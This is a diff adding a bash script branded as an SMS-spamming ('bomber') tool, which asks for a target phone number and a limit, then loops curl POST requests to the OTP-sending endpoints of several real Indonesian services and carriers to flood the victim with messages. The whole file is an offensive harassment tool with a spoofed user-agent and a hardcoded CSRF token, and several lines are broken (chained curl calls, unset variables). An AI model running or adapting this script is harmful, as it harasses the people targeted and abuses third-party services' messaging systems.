@@ -1,0 +1,88 @@
+#!/bin/bash
+#Coded {Arvan Apriana} recoded {Abdi Prawira}
+clear
+header(){
+CYAN='\e[36m'
+BLUE='\e[34m'
+GREEN='\e[92m'
+WHITE='\e[37m'
+RED='\e[31m'
+YELLOW='\e[33m'
+GREENLIGHT='\e[39m'
+PURPLE='\e[35m'
+BOLD='\e[1m'
+printf "
+${BOLD}${BLUE}
+____________________________________________________________________________
+
+${RED}
+   ██╗███╗   ██╗███████╗${BLUE} ██████╗ ${RED}███╗   ███╗███╗   ██╗██╗ █████╗ ██╗  ██╗
+   ██║████╗  ██║██╔════╝${BLUE}██╔═══██╗${RED}████╗ ████║████╗  ██║██║██╔══██╗╚██╗██╔╝
+   ██║██╔██╗ ██║███████╗${BLUE}██║   ██║${RED}██╔████╔██║██╔██╗ ██║██║███████║ ╚███╔╝ 
+   ██║██║╚██╗██║╚════██║${BLUE}██║   ██║${RED}██║╚██╔╝██║██║╚██╗██║██║██╔══██║ ██╔██╗ 
+   ██║██║ ╚████║███████║${BLUE}╚██████╔╝${RED}██║ ╚═╝ ██║██║ ╚████║██║██║  ██║██╔╝ ██╗
+   ╚═╝╚═╝  ╚═══╝╚══════╝${BLUE} ╚═════╝ ${RED}╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
+                                                                      
+                             ${YELLOW}Spamming SMS Tools
+                     When your can't Sleep, Play With Me ${BLUE}
+     ${BOLD}github:${RED}abdiprawira   ${BOLD}${BLUE}instagram:${RED}abi.pn   ${BOLD}${BLUE}facebook:${RED}maninthemiddlecat
+${BLUE}____________________________________________________________________________
+${GREEN}
+"
+}
+boom(){
+nomor="${1}"
+duration=$SECONDS
+SECONDS=0
+curl -X POST -d "msisdn=${1}&accept=call" "https://www.tokocash.com/oauth/otp" \
+curl -X POST -d "phone=${1}&smsType=1" "http://sc.jd.id/phone/sendPhoneSms" \
+curl -X POST -d "phone_number=${1}" "https://www.phd.co.id/en/users/sendOTP" \
+curl -X POST -d "msisdn=${1}" "https://registrasi.tri.co.id/daftar/generateOTP" \
+-H "user-agent: Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
+echo "[+][$i] $send"
+}
+header
+
+# SET NomorHP
+# read -p "Nomor HP : " Nomor HP;
+echo "Method : "
+echo "1. BOM With All Operator Methode"
+echo "2. BOM SMS Telkomsel Provider"
+echo "3. BOM SMS Three Provider"
+read -p "Choose Your Method : " method;
+
+if [ $method -eq 1 ]; then
+	read -p "Nomor target: " nomor;
+	read -p "Limit: " limit;
+	if [[ $perSec == '' ]]; then
+  	read -p "Delay time: " perSecs
+  	duration=$SECONDS
+    echo "[$header] ========= $perSec Please. $(($duration / 3600)) Wait $(($duration / 60)) ========= $(($duration % 60)) "
+    sleep $perSec
+fi
+	for (( i = 0; i < $limit; i++ )); do
+
+		boom $nomor
+done
+elif [[ $method -eq "2" ]]; then
+		url="https://mobi.telkomsel.com/ulang/token"
+		ref="http://sc.jd.id/phone/bindingPhone.html"
+		read -p "[+] Target	: " target
+		read -p "[+] Spam Limit	: " limit
+		echo -ne "\n"
+		for i in $(seq 1 $limit):
+  	do
+		tsel=$(curl -s -A "$ua" -e "$ref" -X POST -d "ci_csrf_token=daaac6aa63d46b9709f0e3d054a65c9b&msisdn=$target" "$url")
+		printf "[!] $no => $tsel\n"
+done
+elif [[ $method -eq "3" ]]; then
+		url="https://registrasi.tri.co.id/daftar/generateOTP"
+		read -p "[+] Target	: " target
+		read -p "[+] Spam Limit	: " limit
+		echo -ne "\n"
+		for i in $(seq 1 $limit):
+  	do
+		three=$(curl -s -A "$ua" -e -X POST -d "msisdn=${1}" "$url")
+		printf "[!] $no => $three\n"
+done
+fi
